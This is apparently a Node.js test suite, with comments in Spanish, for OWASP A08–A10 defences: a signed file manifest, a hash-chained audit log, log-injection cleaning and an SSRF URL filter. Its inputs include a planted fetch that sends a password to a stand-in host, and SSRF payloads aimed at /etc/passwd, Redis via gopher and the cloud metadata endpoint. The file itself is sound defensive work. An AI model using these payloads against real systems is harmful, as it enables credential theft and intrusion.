// Pruebas de las protecciones OWASP A08, A09 y A10:  npm test
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

process.env.MFA_CLAVE = process.env.MFA_CLAVE && /^[0-9a-f]{64}$/i.test(process.env.MFA_CLAVE) ? process.env.MFA_CLAVE : 'ab'.repeat(32);
process.env.JWT_SECRET = process.env.JWT_SECRET || 'p'.repeat(64);

const { revisarEstructura } = require('../src/seguridad/datos-seguros');
const codigo = require('../src/seguridad/integridad-codigo');
const cadena = require('../src/seguridad/cadena-bitacora');
const ssrf = require('../src/seguridad/ssrf');
const { texto, construirFila, fechaLocal } = require('../src/bitacora');
const V = require('../public/js/validacion');

/* ------------------------------- A08 ------------------------------- */
test('[A08] Se detectan claves de contaminación de prototipo en cualquier nivel', () => {
  assert.deepEqual(revisarEstructura(JSON.parse('{"nombre":"x","__proto__":{"esAdmin":true}}')), { motivo: 'prototipo', ruta: 'body.__proto__' });
  assert.equal(revisarEstructura(JSON.parse('{"a":{"constructor":{"prototype":{"x":1}}}}')).motivo, 'prototipo');
  assert.equal(revisarEstructura({ a: [{ b: 1 }], c: 'texto' }), null);
  let profundo = { x: 1 };
  for (let i = 0; i < 12; i++) profundo = { n: profundo };
  assert.equal(revisarEstructura(profundo).motivo, 'profundidad');
  assert.equal(revisarEstructura(Buffer.from('%PDF-1.4')), null);
});

test('[A08] El manifiesto firmado detecta archivos modificados, nuevos y borrados', () => {
  const raiz = fs.mkdtempSync(path.join(os.tmpdir(), 'rs-integridad-'));
  fs.mkdirSync(path.join(raiz, 'public', 'js'), { recursive: true });
  fs.mkdirSync(path.join(raiz, 'src'), { recursive: true });
  fs.writeFileSync(path.join(raiz, 'server.js'), 'console.log(1)');
  fs.writeFileSync(path.join(raiz, 'public', 'js', 'login.js'), 'const a = 1;');
  fs.writeFileSync(path.join(raiz, 'src', 'x.js'), 'module.exports = 1;');

  const m = codigo.generarManifiesto(raiz);
  assert.equal(m.total, 3);
  assert.equal(codigo.verificarManifiesto(raiz).estado, 'ok');

  fs.writeFileSync(path.join(raiz, 'public', 'js', 'login.js'), 'const a = 1; fetch("https://malo.com?p=" + contrasena);');
  fs.writeFileSync(path.join(raiz, 'src', 'puerta-trasera.js'), 'x');
  fs.unlinkSync(path.join(raiz, 'src', 'x.js'));
  const r = codigo.verificarManifiesto(raiz);
  assert.equal(r.estado, 'modificado');
  assert.deepEqual(r.modificados, ['public/js/login.js']);
  assert.deepEqual(r.nuevos, ['src/puerta-trasera.js']);
  assert.deepEqual(r.faltantes, ['src/x.js']);

  // Si alguien edita integridad.json para "tapar" el cambio, la firma deja de valer
  const archivo = path.join(raiz, 'integridad.json');
  const falso = JSON.parse(fs.readFileSync(archivo, 'utf8'));
  falso.archivos['public/js/login.js'] = '0'.repeat(64);
  fs.writeFileSync(archivo, JSON.stringify(falso));
  assert.equal(codigo.verificarManifiesto(raiz).estado, 'firma_invalida');
  fs.rmSync(raiz, { recursive: true, force: true });
});

/* ------------------------------- A09 ------------------------------- */
function crearCadena(n) {
  const filas = [];
  let anterior = cadena.GENESIS;
  for (let i = 1; i <= n; i++) {
    const fila = {
      idBitacora: i, Fecha: `2026-11-19 10:00:${String(i).padStart(2, '0')}`, idUsuario: 1, Correo_Usuario: 'admin@ranchoseco.com',
      Rol_Usuario: 'Administrador', Accion: 'LOGIN_EXITOSO', Modulo: 'Autenticación', Tabla_Afectada: null, idRegistro: null,
      Descripcion: `Evento ${i}`, Datos_Anteriores: null, Datos_Nuevos: null, IP: '::1', Navegador: 'Prueba', Resultado: 'Éxito', Origen: 'Aplicación'
    };
    fila.Hash_Integridad = cadena.firmaDe(anterior, fila);
    anterior = fila.Hash_Integridad;
    filas.push(fila);
  }
  return { filas, estado: { Ultimo_Hash: anterior, Total: n, Ultimo_id: n } };
}

test('[A09] Una bitácora sin cambios pasa la revisión', () => {
  const { filas, estado } = crearCadena(10);
  const r = cadena.verificarCadena(filas, estado);
  assert.equal(r.ok, true);
  assert.equal(r.firmados, 10);
});

test('[A09] Se detecta un registro modificado directamente en la base de datos', () => {
  const { filas, estado } = crearCadena(10);
  filas[4].Descripcion = 'Inicio de sesión normal';       // el atacante "borra su rastro"
  const r = cadena.verificarCadena(filas, estado);
  assert.equal(r.ok, false);
  assert.deepEqual(r.problemas.map((p) => p.clave), ['alterado:5']);
});

test('[A09] Se detecta un registro borrado (en medio y al final)', () => {
  const a = crearCadena(10);
  a.filas.splice(3, 1);
  const r = cadena.verificarCadena(a.filas, a.estado);
  assert.ok(r.problemas.some((p) => p.clave === 'alterado:5'));
  assert.ok(r.problemas.some((p) => p.tipo === 'faltan'));

  const b = crearCadena(10);
  b.filas.pop();
  const r2 = cadena.verificarCadena(b.filas, b.estado);
  assert.equal(r2.ok, false);
  assert.ok(r2.problemas.some((p) => p.tipo === 'faltan'));
});

test('[A09] Se detecta un registro falso insertado a mano (con o sin firma inventada)', () => {
  const { filas, estado } = crearCadena(6);
  const falso = { ...filas[2], idBitacora: 3.5, Descripcion: 'El admin borró todo', Hash_Integridad: 'f'.repeat(64) };
  const sinFirma = { ...filas[2], idBitacora: 3.7, Hash_Integridad: null };
  filas.splice(3, 0, falso, sinFirma);
  const r = cadena.verificarCadena(filas, estado);
  const claves = r.problemas.map((p) => p.clave);
  assert.ok(claves.includes('alterado:3.5'));
  assert.ok(claves.includes('sin_firma:3.7'));
  assert.ok(!claves.includes('alterado:4'), 'el registro legítimo siguiente no debe marcarse');
});

test('[A09] Los cambios directos registrados por los triggers (Origen "Base de datos") no son alteraciones', () => {
  const { filas, estado } = crearCadena(4);
  filas.splice(2, 0, { ...filas[1], idBitacora: 2.5, Origen: 'Base de datos', Hash_Integridad: null });
  const r = cadena.verificarCadena(filas, estado);
  assert.equal(r.ok, true);
  assert.equal(r.sinFirmaBD, 1);
});

test('[A09] Una alteración marcada como revisada deja de contar como pendiente', () => {
  const { filas, estado } = crearCadena(5);
  filas[1].Descripcion = 'cambiado';
  const r = cadena.verificarCadena(filas, estado, new Set(['alterado:2']));
  assert.equal(r.ok, true);
  assert.equal(r.problemas[0].revisado, true);
});

test('[A09] Anti "log injection": no se pueden meter renglones falsos en la bitácora', () => {
  assert.equal(texto('correo@x.com\n2026-11-19 LOGIN_EXITOSO admin', 500), 'correo@x.com 2026-11-19 LOGIN_EXITOSO admin');
  assert.equal(texto('a\r\nb\tc\u0000d e‮f', 500), 'a  b c d e f');
  // SQL Server mide NVARCHAR en unidades UTF-16: cada emoji ocupa 2, y nunca se parte uno a la mitad
  assert.equal(texto('😀'.repeat(600), 500).length, 500);
  assert.equal(Array.from(texto('😀'.repeat(600), 500)).length, 250);
  assert.equal(texto('a' + '😀'.repeat(600), 500).length, 499);
  const fila = construirFila({ ip: '::1', headers: { 'user-agent': 'Mozilla\n[ADMIN] falso' } },
    { accion: 'PRUEBA', modulo: 'X', descripcion: 'uno\ndos', antes: { contrasena: 'secreta', nombre: 'Ana' } });
  assert.equal(fila.Descripcion, 'uno dos');
  assert.equal(fila.Navegador, 'Mozilla [ADMIN] falso');
  assert.equal(fila.Datos_Anteriores, '{"nombre":"Ana"}');            // sin la contraseña
  assert.match(fila.Fecha, /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/);
  assert.match(fechaLocal(new Date(2026, 0, 2, 3, 4, 5)), /^2026-01-02 03:04:05$/);
});

test('[A09] El monitor crea una alerta con 5 eventos sospechosos de la misma IP', async () => {
  const monitor = require('../src/seguridad/monitor');
  const creadas = [];
  monitor._reiniciar();
  monitor._dependencias({ consulta: async () => [], registrar: async (_req, datos) => { creadas.push(datos); } });
  const espera = () => new Promise((r) => setTimeout(r, 20));

  for (let i = 0; i < 4; i++) monitor.observar({ Accion: 'INTENTO_INYECCION', IP: '203.0.113.9' });
  await espera();
  assert.equal(creadas.length, 0);
  monitor.observar({ Accion: 'TOKEN_MANIPULADO', IP: '203.0.113.9' });
  await espera();
  assert.equal(creadas.length, 1);
  assert.equal(creadas[0].accion, 'ALERTA_SEGURIDAD');
  assert.match(creadas[0].descripcion, /5 eventos de seguridad desde la IP 203\.0\.113\.9/);

  monitor.observar({ Accion: 'TOKEN_MANIPULADO', IP: '203.0.113.9' });     // no se repite en 30 min
  monitor.observar({ Accion: 'LOGIN_EXITOSO', IP: '198.51.100.7' });       // lo normal no alerta
  await espera();
  assert.equal(creadas.length, 1);

  monitor.observar({ Accion: 'FUERZA_BRUTA', IP: '198.51.100.7' });        // alerta inmediata
  monitor.observar({ Accion: 'INTENTO_SSRF', IP: '198.51.100.7', Correo_Usuario: 'admin@ranchoseco.com' });
  await espera();
  assert.deepEqual(creadas.slice(1).map((c) => c.idRegistro), ['fuerza_bruta:198.51.100.7', 'ssrf:admin@ranchoseco.com']);
  monitor._reiniciar();
});

/* ------------------------------- A10 ------------------------------- */
const bloqueada = (url) => { try { ssrf.revisarUrl(url); return null; } catch (e) { return e.motivo; } };

test('[A10] Solo se aceptan enlaces https públicos', () => {
  assert.equal(bloqueada('https://www.google.com/images/logo.png'), null);
  assert.equal(bloqueada('http://localhost:3000/.env'), 'protocolo');
  assert.equal(bloqueada('file:///etc/passwd'), 'protocolo');
  assert.equal(bloqueada('gopher://127.0.0.1:6379/_FLUSHALL'), 'protocolo');
  assert.equal(bloqueada('https://usuario:clave@sitio.com/x.png'), 'credenciales');
  assert.equal(bloqueada('https://sitio.com:8443/x.png'), 'puerto');
});

test('[A10] Se bloquean IPs internas, también escritas de formas "raras"', () => {
  for (const url of ['https://127.0.0.1/', 'https://127.1/', 'https://0x7f000001/', 'https://2130706433/', 'https://017700000001/',
    'https://0.0.0.0/', 'https://10.1.2.3/', 'https://172.16.0.1/', 'https://172.31.255.255/', 'https://192.168.1.1/',
    'https://169.254.169.254/latest/meta-data/', 'https://100.64.0.1/', 'https://[::1]/', 'https://[::ffff:127.0.0.1]/',
    'https://[::ffff:a9fe:a9fe]/', 'https://[fd12:3456::1]/', 'https://[fe80::1]/', 'https://[64:ff9b::a00:1]/']) {
    assert.equal(bloqueada(url), 'ip_interna', url);
  }
  assert.equal(bloqueada('https://172.32.0.1/'), null);   // fuera del rango privado 172.16–31
  assert.equal(bloqueada('https://8.8.8.8/'), null);
});

test('[A10] Se bloquean nombres internos', () => {
  for (const url of ['https://localhost/', 'https://app.localhost/', 'https://impresora.local/', 'https://metadata.google.internal/', 'https://intranet/']) {
    assert.equal(bloqueada(url), 'nombre_interno', url);
  }
});

test('[A10] El DNS se revisa: un dominio público que apunta a 127.0.0.1 se rechaza', async () => {
  const buscar = async (h) => ({
    'localtest.me': [{ address: '127.0.0.1', family: 4 }],
    'mixto.ejemplo.com': [{ address: '93.184.216.34', family: 4 }, { address: '10.0.0.8', family: 4 }],
    'bueno.ejemplo.com': [{ address: '93.184.216.34', family: 4 }]
  })[h];
  await assert.rejects(ssrf.resolverSeguro('localtest.me', { buscar }), (e) => e.motivo === 'dns_interno');
  await assert.rejects(ssrf.resolverSeguro('mixto.ejemplo.com', { buscar }), (e) => e.motivo === 'dns_interno');
  assert.deepEqual(await ssrf.resolverSeguro('bueno.ejemplo.com', { buscar }), { address: '93.184.216.34', family: 4 });
});

test('[A10] Lista opcional de dominios permitidos (SSRF_DOMINIOS)', () => {
  process.env.SSRF_DOMINIOS = 'drive.google.com, dropbox.com';
  try {
    assert.equal(bloqueada('https://drive.google.com/archivo.pdf'), null);
    assert.equal(bloqueada('https://dl.dropbox.com/x.png'), null);
    assert.equal(bloqueada('https://otro-sitio.com/x.png'), 'dominio');
  } finally {
    delete process.env.SSRF_DOMINIOS;
  }
});

test('[A10] El navegador solo revisa el formato: el bloqueo real lo hace el servidor', () => {
  assert.equal(V.validarEnlace({ url: 'http://localhost:3000/.env' }).ok, true);   // llega al servidor y ahí se bloquea
  assert.equal(V.validarEnlace({ url: 'no es un enlace' }).ok, false);
  assert.equal(V.validarEnlace({ url: `https://a.com/${'x'.repeat(600)}` }).ok, false);
  assert.equal(ssrf.urlParaBitacora('https://yo:secreto@sitio.com/a.png'), 'https://sitio.com/a.png');
});
